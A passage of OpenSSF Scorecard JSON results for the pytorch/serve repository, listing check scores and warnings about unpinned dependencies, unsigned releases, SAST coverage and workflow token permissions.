                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 14 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark_nightly.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark_nightly.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark_nightly.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark_nightly.yml:58: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_nightly.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark_nightly.yml:63: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark_nightly.yml:75: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_nightly.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/benchmark_nightly.yml:81: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark_torch_compile_nightly.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_torch_compile_nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark_torch_compile_nightly.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_torch_compile_nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/benchmark_torch_compile_nightly.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/benchmark_torch_compile_nightly.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-cpu-cpp.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci-cpu-cpp.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-cpu-cpp.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci-cpu-cpp.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci-cpu-cpp.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci-cpu-cpp.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_cpu.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_cpu.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_cpu.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_cpu.yml:44: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_cpu.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci_cpu.yml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_gpu.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_gpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_gpu.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_gpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_gpu.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_gpu.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci_gpu.yml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_gpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_graviton_cpu.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_graviton_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_graviton_cpu.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_graviton_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/ci_graviton_cpu.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_graviton_cpu.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/ci_graviton_cpu.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/ci_graviton_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/codeql.yml:66: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/codeql.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/doc-automation.yml:15: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/doc-automation.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/doc-automation.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/doc-automation.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/doc-automation.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/doc-automation.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/doc-automation.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/doc-automation.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docker-ci.yaml:19: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/docker-ci.yaml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docker-nightly-build.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/docker-nightly-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docker-nightly-build.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/docker-nightly-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docker-nightly-build.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/docker-nightly-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/kserve_cpu_tests.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/kserve_cpu_tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/kserve_cpu_tests.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/kserve_cpu_tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/kserve_cpu_tests.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/kserve_cpu_tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/kserve_gpu_tests.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/kserve_gpu_tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/kserve_gpu_tests.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/kserve_gpu_tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/kserve_gpu_tests.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/kserve_gpu_tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/kubernetes_tests.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/kubernetes_tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/kubernetes_tests.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/kubernetes_tests.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:18: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/lint.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/lint.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/lint.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/lint.yml:56: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/lint.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/lint.yml:81: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/lint.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/lint.yml:90: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/lint.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/official_release.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/official_release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/official_release.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/official_release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/official_release.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/official_release.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/official_release_docker.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/official_release_docker.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/official_release_docker.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/official_release_docker.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_cpu.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_cpu.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_cpu.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_cpu.yml:43: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_cpu_binaries.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_cpu_binaries.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/regression_tests_cpu_binaries.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_cpu_binaries.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_cpu_binaries.yml:40: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_cpu_binaries.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_cpu_binaries.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_cpu_binaries.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_docker.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_docker.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/regression_tests_docker.yml:64: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_docker.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_gpu.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_gpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_gpu.yml:39: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_gpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_gpu.yml:44: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_gpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_gpu_binaries.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_gpu_binaries.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/regression_tests_gpu_binaries.yml:33: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_gpu_binaries.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_gpu_binaries.yml:38: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_gpu_binaries.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_gpu_binaries.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_gpu_binaries.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_graviton_cpu.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_graviton_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_graviton_cpu.yml:26: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_graviton_cpu.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/regression_tests_graviton_cpu.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/regression_tests_graviton_cpu.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/torchserve-nightly-build.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/torchserve-nightly-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/torchserve-nightly-build.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/torchserve-nightly-build.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/torchserve-nightly-build.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/torchserve-nightly-build.yml/master?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/torchserve-nightly-build.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/pytorch/serve/torchserve-nightly-build.yml/master?enable=pin",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:30",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:110",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:155",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile:200",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.dev:15",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.dev:62",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.dev:93",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.dev:113",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.neuron.dev:20",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.neuron.dev:67",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.neuron.dev:93",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.neuron.dev:113",
                        "Warn: containerImage not pinned by hash: docker/Dockerfile.vllm:1",
                        "Warn: containerImage not pinned by hash: examples/LLM/llama/chat_app/docker/Dockerfile:3",
                        "Warn: containerImage not pinned by hash: kubernetes/kserve/Dockerfile:14",
                        "Warn: containerImage not pinned by hash: kubernetes/kserve/Dockerfile.dev:15",
                        "Warn: containerImage not pinned by hash: kubernetes/kserve/Dockerfile.dev:55",
                        "Warn: containerImage not pinned by hash: kubernetes/kserve/Dockerfile.dev:84",
                        "Warn: containerImage not pinned by hash: kubernetes/kserve/Dockerfile.dev:104",
                        "Warn: containerImage not pinned by hash: kubernetes/kserve/examples/gpt_fast/Dockerfile:1: pin your Docker image by updating pytorch/torchserve-kfs-nightly:latest-gpu to pytorch/torchserve-kfs-nightly:latest-gpu@sha256:a0b47fbe265de5c37ba0338974a96260be591c1e876512cd63501d09b7a98967",
                        "Warn: containerImage not pinned by hash: kubernetes/kserve/image_transformer/transformer.Dockerfile:1: pin your Docker image by updating python:3.8.18-slim to python:3.8.18-slim@sha256:e796941013b10bb53a0924d8705485a1afe654bbbc6fe71d32509101e44b6414",
                        "Warn: containerImage not pinned by hash: kubernetes/tests/docker/Dockerfile:1: pin your Docker image by updating pytorch/torchserve-nightly:latest-gpu to pytorch/torchserve-nightly:latest-gpu@sha256:c8258cbcce6c289928a4ce566aa88ee1b821d8949704b9cb1ca1fb7e7d537869",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:64",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:99-107",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:99-107",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:99-107",
                        "Warn: npmCommand not pinned by hash: docker/Dockerfile:161-184",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:191",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:247-257",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile:247-257",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.dev:72-83",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.dev:72-83",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.neuron.dev:53",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.neuron.dev:70-83",
                        "Warn: pipCommand not pinned by hash: docker/Dockerfile.vllm:6",
                        "Warn: pipCommand not pinned by hash: examples/LLM/llama/chat_app/docker/Dockerfile:15",
                        "Warn: pipCommand not pinned by hash: examples/LLM/llama/chat_app/docker/Dockerfile:18-21",
                        "Warn: pipCommand not pinned by hash: kubernetes/kserve/Dockerfile:18",
                        "Warn: pipCommand not pinned by hash: kubernetes/kserve/Dockerfile:22",
                        "Warn: pipCommand not pinned by hash: kubernetes/kserve/Dockerfile.dev:52",
                        "Warn: pipCommand not pinned by hash: kubernetes/kserve/Dockerfile.dev:58-75",
                        "Warn: pipCommand not pinned by hash: kubernetes/kserve/Dockerfile.dev:58-75",
                        "Warn: pipCommand not pinned by hash: kubernetes/kserve/examples/gpt_fast/Dockerfile:4",
                        "Warn: pipCommand not pinned by hash: kubernetes/kserve/examples/gpt_fast/Dockerfile:4",
                        "Warn: pipCommand not pinned by hash: kubernetes/kserve/image_transformer/transformer.Dockerfile:8",
                        "Warn: pipCommand not pinned by hash: kubernetes/kserve/image_transformer/transformer.Dockerfile:10",
                        "Warn: pipCommand not pinned by hash: benchmarks/benchmark_model_dependencies.sh:6",
                        "Warn: pipCommand not pinned by hash: benchmarks/install_dependencies.sh:36",
                        "Warn: pipCommand not pinned by hash: benchmarks/install_dependencies.sh:37",
                        "Warn: pipCommand not pinned by hash: benchmarks/install_dependencies.sh:40",
                        "Warn: pipCommand not pinned by hash: benchmarks/install_dependencies.sh:44",
                        "Warn: pipCommand not pinned by hash: examples/LLM/llama/chat_app/package_llama.sh:16",
                        "Warn: pipCommand not pinned by hash: examples/LLM/llama/chat_app/package_llama.sh:24",
                        "Warn: pipCommand not pinned by hash: examples/asr_rnnt_emformer/00_save_jit_model.sh:6",
                        "Warn: pipCommand not pinned by hash: examples/large_models/segment_anything_fast/install_segment_anything_fast.sh:4",
                        "Warn: pipCommand not pinned by hash: examples/large_models/segment_anything_fast/install_segment_anything_fast.sh:9",
                        "Warn: pipCommand not pinned by hash: examples/nmt_transformer/create_mar.sh:20",
                        "Warn: pipCommand not pinned by hash: examples/text_to_speech_synthesizer/SpeechT5/setup.sh:6",
                        "Warn: pipCommand not pinned by hash: ts_scripts/install_utils:32",
                        "Warn: pipCommand not pinned by hash: ts_scripts/install_utils:34",
                        "Warn: pipCommand not pinned by hash: ts_scripts/install_utils:40",
                        "Warn: pipCommand not pinned by hash: ts_scripts/install_utils:45",
                        "Warn: pipCommand not pinned by hash: ts_scripts/install_utils:160",
                        "Warn: pipCommand not pinned by hash: ts_scripts/install_utils:167",
                        "Warn: pipCommand not pinned by hash: ts_scripts/install_utils:181",
                        "Warn: npmCommand not pinned by hash: ts_scripts/mac_npm_deps:16",
                        "Warn: pipCommand not pinned by hash: .github/workflows/benchmark_nightly.yml:45",
                        "Warn: pipCommand not pinned by hash: .github/workflows/benchmark_torch_compile_nightly.yml:41",
                        "Warn: pipCommand not pinned by hash: .github/workflows/doc-automation.yml:23",
                        "Warn: pipCommand not pinned by hash: .github/workflows/lint.yml:51",
                        "Warn: pipCommand not pinned by hash: .github/workflows/lint.yml:86",
                        "Warn: pipCommand not pinned by hash: .github/workflows/lint.yml:26",
                        "Warn: pipCommand not pinned by hash: .github/workflows/official_release.yml:27",
                        "Warn: pipCommand not pinned by hash: .github/workflows/torchserve-nightly-build.yml:27",
                        "Info:   0 out of  66 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  16 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of  22 containerImage dependencies pinned",
                        "Info:   0 out of  50 pipCommand dependencies pinned",
                        "Info:   0 out of   2 npmCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 7,
                    "reason": "SAST tool detected but not run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v0.12.0 not signed: https://api.github.com/repos/pytorch/serve/releases/177137525",
                        "Warn: release artifact v0.11.1 not signed: https://api.github.com/repos/pytorch/serve/releases/165902110",
                        "Warn: release artifact v0.11.0 not signed: https://api.github.com/repos/pytorch/serve/releases/156196476",
                        "Warn: release artifact v0.10.0 not signed: https://api.github.com/repos/pytorch/serve/releases/146164376",
                        "Warn: release artifact v0.9.0 not signed: https://api.github.com/repos/pytorch/serve/releases/124894767",
                        "Warn: release artifact v0.12.0 does not have provenance: https://api.github.com/repos/pytorch/serve/releases/177137525",
                        "Warn: release artifact v0.11.1 does not have provenance: https://api.github.com/repos/pytorch/serve/releases/165902110",
                        "Warn: release artifact v0.11.0 does not have provenance: https://api.github.com/repos/pytorch/serve/releases/156196476",
                        "Warn: release artifact v0.10.0 does not have provenance: https://api.github.com/repos/pytorch/serve/releases/146164376",
                        "Warn: release artifact v0.9.0 does not have provenance: https://api.github.com/repos/pytorch/serve/releases/124894767"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/codeql.yml:25",
                        "Info: jobLevel 'contents' permission set to 'read': .github/workflows/codeql.yml:26",
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/doc-automation.yml:12",
                        "Warn: no topLevel permission defined: .github/workflows/benchmark_nightly.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/benchmark_torch_compile_nightly.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci-cpu-cpp.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci_cpu.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci_gpu.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/ci_graviton_cpu.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/codeql.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/doc-automation.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docker-ci.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/docker-nightly-build.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/kserve_cpu_tests.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/kserve_gpu_tests.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/kubernetes_tests.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/lint.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/official_release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/official_release_docker.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/regression_tests_cpu.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/regression_tests_cpu_binaries.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/regression_tests_docker.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/regression_tests_gpu.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/regression_tests_gpu_binaries.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/regression_tests_graviton_cpu.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/torchserve-nightly-build.yml:1"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
